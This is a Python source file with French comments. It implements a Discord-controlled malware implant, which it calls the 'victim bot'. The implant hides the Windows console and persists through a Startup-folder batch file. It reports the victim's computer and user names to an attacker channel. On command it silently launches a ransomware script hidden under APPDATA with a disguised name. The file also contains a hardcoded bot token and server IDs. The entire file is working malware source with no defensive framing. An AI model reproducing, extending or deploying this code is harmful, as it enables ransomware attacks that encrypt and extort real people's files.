import discord
import asyncio
import os
import subprocess
import sys
from datetime import datetime

# =============================================
# CONFIGURATION DU BOT VICTIME
# =============================================

BOT_TOKEN = "MTQzMDg3NzQyOTcwMTkzOTMwMQ.Gqveb4.K6ngAq7yB-k3emg2odOLeEuHCum5U2srfwII38"  # Token du bot victime
SERVER_ID = 1430521439164960840  # ID du serveur Discord
CHANNEL_ID = 1430877957588779089  # ID du canal de commandes

RANSOMWARE_PATH = os.path.join(os.getenv('APPDATA'), 'Microsoft\\WindowsTools\\WindowsToolsMaker.py')

# =============================================
# CLIENT DISCORD
# =============================================

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# =============================================
# FONCTIONS
# =============================================

def masquer_console():
    """Masque la console Windows"""
    try:
        import ctypes
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    except:
        pass

def ajouter_demarrage():
    """Ajoute le bot au démarrage"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        startup_bat = os.path.join(startup_dir, 'DiscordBot.bat')
        
        if not os.path.exists(startup_bat):
            batch_content = f'@echo off\nstart /min pythonw "{script_path}"\n'
            with open(startup_bat, 'w') as f:
                f.write(batch_content)
    except:
        pass

def log_message(message):
    """Log un message"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def lancer_ransomware():
    """Lance le ransomware"""
    try:
        if os.path.exists(RANSOMWARE_PATH):
            subprocess.Popen(['python', RANSOMWARE_PATH], 
                           creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
            return True
        return False
    except:
        return False

# =============================================
# ÉVÉNEMENTS DU BOT
# =============================================

@client.event
async def on_ready():
    """Quand le bot se connecte"""
    log_message(f"✅ Bot victime connecté en tant que {client.user}")
    log_message(f"🎯 Serveur: {SERVER_ID}")
    log_message("🕵️  En attente des commandes...")
    
    # Envoyer un message de statut
    try:
        channel = client.get_channel(CHANNEL_ID)
        if channel:
            await channel.send(f"🔴 **VICTIME EN LIGNE** - `{os.getenv('COMPUTERNAME')}\\{os.getenv('USERNAME')}` - Prête pour les commandes")
    except:
        pass

@client.event
async def on_message(message):
    """Quand un message est reçu"""
    # Ignorer les messages du bot lui-même
    if message.author == client.user:
        return
    
    # Vérifier que c'est dans le bon serveur et canal
    if message.guild and message.guild.id == SERVER_ID and message.channel.id == CHANNEL_ID:
        content = message.content.upper()
        
        # Commandes d'attaque
        if any(cmd in content for cmd in ["START_ATTACK", "EXECUTE", "LAUNCH", "!ATTACK"]):
            log_message("🎯 Commande d'attaque reçue!")
            
            try:
                await message.channel.send("🚨 **EXÉCUTION DU RANSOMWARE** - Lancement en cours...")
                
                if lancer_ransomware():
                    await message.channel.send("✅ **RANSOMWARE ACTIVÉ** - Les fichiers sont en cours de chiffrement!")
                    log_message("✅ Ransomware lancé avec succès")
                else:
                    await message.channel.send("❌ **ERREUR** - Impossible de lancer le ransomware")
                    log_message("❌ Erreur lancement ransomware")
                    
            except Exception as e:
                log_message(f"❌ Erreur: {e}")
        
        # Commande de statut
        elif any(cmd in content for cmd in ["STATUS", "!STATUS", "PING"]):
            try:
                await message.channel.send(f"🟢 **VICTIME ACTIVE** - `{os.getenv('COMPUTERNAME')}\\{os.getenv('USERNAME')}` - Surveillance opérationnelle")
            except:
                pass

# =============================================
# DÉMARRAGE
# =============================================

if __name__ == "__main__":
    # Masquer la console
    masquer_console()
    
    # Ajouter au démarrage
    ajouter_demarrage()
    
    # Démarrer le bot
    try:
        client.run(BOT_TOKEN)
    except Exception as e:
        log_message(f"❌ Erreur connexion bot: {e}")
